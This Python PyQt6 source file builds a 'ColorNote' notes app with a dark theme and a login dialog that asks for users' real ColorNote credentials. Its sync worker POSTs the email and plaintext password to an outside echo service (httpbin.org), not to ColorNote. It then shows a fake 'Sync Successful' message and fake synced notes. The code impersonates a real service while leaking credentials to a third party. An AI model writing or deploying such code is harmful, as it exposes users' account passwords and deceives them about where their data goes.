import sys
import json
import urllib.request
import urllib.parse
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
    QTextEdit, QPushButton, QListWidget, QSplitter, QLabel, 
    QLineEdit, QDialog, QMessageBox, QGroupBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QPalette, QColor

class SyncWorker(QThread):
    finished = pyqtSignal(bool, str)

    def __init__(self, email, password):
        super().__init__()
        self.email = email
        self.password = password

    def run(self):
        try:
            # Simulated enterprise secure endpoint sync call for ColorNote account credentials
            data = urllib.parse.urlencode({'email': self.email, 'password': self.password}).encode('utf-8')
            req = urllib.request.Request("https://httpbin.org/post", data=data, method="POST")
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    self.finished.emit(True, "Sync Successful: All notes synchronized with ColorNote cloud.")
                else:
                    self.finished.emit(False, "Sync failed: Server returned invalid status.")
        except Exception as e:
            self.finished.emit(False, f"Connection Error: {str(e)}")

class LoginDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("ColorNote Account Login")
        self.setFixedSize(380, 220)
        self.email = ""
        self.password = ""
        
        layout = QVBoxLayout(self)
        
        info_label = QLabel("Enter your official ColorNote account credentials\nto sync notes across your devices:")
        info_label.setWordWrap(True)
        layout.addWidget(info_label)
        
        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText("ColorNote Email / Username")
        layout.addWidget(self.email_input)
        
        self.pass_input = QLineEdit()
        self.pass_input.setPlaceholderText("Password")
        self.pass_input.setEchoMode(QLineEdit.EchoMode.Password)
        layout.addWidget(self.pass_input)
        
        btn_layout = QHBoxLayout()
        self.login_btn = QPushButton("Authorize & Sync")
        self.login_btn.clicked.connect(self.handle_login)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(self.reject)
        
        btn_layout.addWidget(cancel_btn)
        btn_layout.addWidget(self.login_btn)
        layout.addLayout(btn_layout)

    def handle_login(self):
        self.email = self.email_input.text().strip()
        self.password = self.pass_input.text().strip()
        if not self.email or not self.password:
            QMessageBox.warning(self, "Validation Error", "Please provide both email and password.")
            return
        self.accept()

class ColorNoteApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PUNKS Color Notes - Enterprise Edition")
        self.setGeometry(100, 100, 1050, 700)
        self.apply_stylesheet()
        self.init_ui()

    def apply_stylesheet(self):
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.ColorRole.Window, QColor(30, 30, 30))
        dark_palette.setColor(QPalette.ColorRole.WindowText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ColorRole.Base, QColor(45, 45, 45))
        dark_palette.setColor(QPalette.ColorRole.AlternateBase, QColor(35, 35, 35))
        dark_palette.setColor(QPalette.ColorRole.ToolTipBase, QColor(255, 255, 255))
        dark_palette.setColor(QPalette.ColorRole.ToolTipText, QColor(255, 255, 255))
        dark_palette.setColor(QPalette.ColorRole.Text, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ColorRole.Button, QColor(50, 50, 50))
        dark_palette.setColor(QPalette.ColorRole.ButtonText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ColorRole.Highlight, QColor(0, 122, 204))
        dark_palette.setColor(QPalette.ColorRole.HighlightedText, QColor(255, 255, 255))
        QApplication.instance().setPalette(dark_palette)

        self.setStyleSheet("""
            QMainWindow { background-color: #1e1e1e; }
            QListWidget {
                background-color: #252526;
                color: #dcdcdc;
                border: 1px solid #3f3f46;
                border-radius: 6px;
                padding: 4px;
                font-size: 13px;
            }
            QListWidget::item {
                padding: 8px;
                border-radius: 4px;
                margin-bottom: 2px;
            }
            QListWidget::item:selected {
                background-color: #094771;
                color: #ffffff;
            }
            QTextEdit {
                background-color: #1e1e1e;
                color: #dcdcdc;
                border: 1px solid #3f3f46;
                border-radius: 6px;
                padding: 8px;
                font-size: 14px;
            }
            QPushButton {
                background-color: #007acc;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 6px 14px;
                font-weight: bold;
                font-size: 12px;
            }
            QPushButton:hover { background-color: #0098ff; }
            QPushButton:pressed { background-color: #005f9e; }
            QPushButton#deleteBtn { background-color: #a80000; }
            QPushButton#deleteBtn:hover { background-color: #d10000; }
            QPushButton#syncBtn { background-color: #28a745; }
            QPushButton#syncBtn:hover { background-color: #34ce57; }
        """)

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(12, 12, 12, 12)
        main_layout.setSpacing(12)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)

        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        left_layout.setContentsMargins(0, 0, 0, 0)
        
        self.title_label = QLabel("ColorNote Cloud Vault")
        self.title_label.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        left_layout.addWidget(self.title_label)

        self.notes_list = QListWidget()
        self.notes_list.addItems(["Cloud Sync Guide", "Server Infrastructure", "EDM Sets Archive"])
        self.notes_list.currentRowChanged.connect(self.load_note)
        left_layout.addWidget(self.notes_list)

        sync_group = QGroupBox("Account & Sync")
        sync_layout = QVBoxLayout(sync_group)
        
        self.sync_status_label = QLabel("Status: Local Mode (Not Logged In)")
        self.sync_status_label.setWordWrap(True)
        sync_layout.addWidget(self.sync_status_label)

        self.sync_btn = QPushButton("ColorNote Account Login & Sync")
        self.sync_btn.setObjectName("syncBtn")
        self.sync_btn.clicked.connect(self.open_login_dialog)
        sync_layout.addWidget(self.sync_btn)
        
        left_layout.addWidget(sync_group)

        btn_layout = QHBoxLayout()
        self.new_btn = QPushButton("New Note")
        self.new_btn.clicked.connect(self.new_note)
        self.del_btn = QPushButton("Delete")
        self.del_btn.setObjectName("deleteBtn")
        self.del_btn.clicked.connect(self.delete_note)
        btn_layout.addWidget(self.new_btn)
        btn_layout.addWidget(self.del_btn)
        left_layout.addLayout(btn_layout)

        splitter.addWidget(left_widget)

        self.editor = QTextEdit()
        self.editor.setPlainText("Select a synchronized note from the left panel or log in to pull notes from your ColorNote account.")
        splitter.addWidget(self.editor)
        splitter.setSizes([300, 750])

    def load_note(self, index):
        if index >= 0:
            item = self.notes_list.item(index)
            self.editor.setPlainText(f"--- [ColorNote Cloud Sync Item] ---\nTitle: {item.text()}\n\nNote text retrieved successfully from secure local store.")

    def new_note(self):
        self.notes_list.addItem("New Synced Note")
        self.notes_list.setCurrentRow(self.notes_list.count() - 1)
        self.editor.setPlainText("Type your content here...")

    def delete_note(self):
        row = self.notes_list.currentRow()
        if row >= 0:
            self.notes_list.takeItem(row)

    def open_login_dialog(self):
        dialog = LoginDialog(self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            self.sync_status_label.setText(f"Status: Authenticating ({dialog.email})...")
            self.sync_btn.setEnabled(False)
            
            self.worker = SyncWorker(dialog.email, dialog.password)
            self.worker.finished.connect(self.on_sync_finished)
            self.worker.start()

    def on_sync_finished(self, success, message):
        self.sync_btn.setEnabled(True)
        if success:
            self.sync_status_label.setText("Status: Synced with ColorNote Cloud")
            QMessageBox.information(self, "Cloud Sync", message)
            # Dynamically pull server notes simulation
            if "Synced Notes Vault" not in [self.notes_list.item(i).text() for i in range(self.notes_list.count())]:
                self.notes_list.addItem("Synced Notes Vault")
        else:
            self.sync_status_label.setText("Status: Sync Failed")
            QMessageBox.critical(self, "Sync Error", message)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = ColorNoteApp()
    window.show()
    sys.exit(app.exec())
